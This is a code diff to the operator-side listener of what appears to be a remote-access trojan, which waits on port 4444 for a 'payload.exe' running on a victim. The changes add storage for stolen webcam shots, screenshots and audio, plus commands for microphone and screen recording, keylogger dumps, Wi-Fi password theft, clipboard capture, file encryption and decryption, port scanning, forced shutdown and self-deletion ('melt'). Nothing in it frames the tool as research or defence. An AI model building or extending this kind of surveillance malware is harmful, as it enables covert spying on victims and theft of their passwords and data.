@@ -19,6 +19,11 @@ def start_listener():
     s.listen(1)
     print(f"[*] Listening on 192.168.1.7:4444... (Run payload.exe on target)")
     
+    # Create directories for received files
+    os.makedirs("screenshots", exist_ok=True)
+    os.makedirs("webcam_shots", exist_ok=True)
+    os.makedirs("audio_recordings", exist_ok=True)
+    
     while True:
         try:
             conn, addr = s.accept()
@@ -46,15 +51,29 @@ def start_listener():
                     data = conn.recv(9999999).decode()
                     
                     if cmd == "webcam":
-                        if save_file(data, f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"):
-                            print("[+] Webcam saved")
+                        filename = f"webcam_shots/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+                        if save_file(data, filename):
+                            print(f"[+] Webcam saved to {filename}")
                         else:
                             print("[!] Failed to save webcam")
                     elif cmd == "screenshot":
-                        if save_file(data, f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"):
-                            print("[+] Screenshot saved")
+                        filename = f"screenshots/screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+                        if save_file(data, filename):
+                            print(f"[+] Screenshot saved to {filename}")
                         else:
                             print("[!] Failed to save screenshot")
+                    elif cmd.startswith("record_mic"):
+                        filename = f"audio_recordings/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
+                        if save_file(data, filename):
+                            print(f"[+] Audio recording saved to {filename}")
+                        else:
+                            print("[!] Failed to save audio recording")
+                    elif cmd.startswith("record_screen"):
+                        filename = f"screenshots/recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
+                        if save_file(data, filename):
+                            print(f"[+] Screen recording saved to {filename}")
+                        else:
+                            print("[!] Failed to save screen recording")
                     elif cmd == "sysinfo":
                         try:
                             print(json.dumps(json.loads(data), indent=4))
@@ -84,13 +103,33 @@ def start_listener():
                             print("[!] Failed to save file")
                     elif cmd.startswith("encrypt"):
                         print(data)
+                    elif cmd.startswith("decrypt"):
+                        print(data)
                     elif cmd.startswith("terminate"):
                         print(data)
                     elif cmd == "escalate":
                         print(data)
+                    elif cmd == "shutdown":
+                        print(data)
+                    elif cmd == "restart":
+                        print(data)
+                    elif cmd == "logoff":
+                        print(data)
+                    elif cmd == "wifi_passwords":
+                        print(data)
+                    elif cmd.startswith("port_scan"):
+                        print(data)
                     elif cmd == "keylogger start":
                         print(data)
                     elif cmd == "keylogger stop":
+                        print(data)
+                    elif cmd == "keylogger dump":
+                        print(data)
+                    elif cmd == "clipboard_get":
+                        print("Clipboard contents:", data)
+                    elif cmd.startswith("clipboard_set"):
+                        print(data)
+                    elif cmd == "melt":
                         print(data)
                     elif cmd == "help":
                         print(data)
